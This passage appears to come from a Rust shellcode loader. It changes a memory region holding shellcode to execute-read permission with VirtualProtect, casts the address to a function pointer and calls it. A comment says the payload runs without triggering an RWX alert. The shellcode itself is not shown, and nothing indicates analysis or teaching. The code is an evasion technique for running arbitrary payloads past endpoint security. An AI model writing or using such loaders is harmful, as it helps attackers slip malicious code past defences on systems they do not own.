    let success = VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);

    if success != 0 {
        // Execute the payload safely without ever triggering an RWX alert
        let exec: extern "C" fn() = std::mem::transmute(addr);
        exec();
    }
}

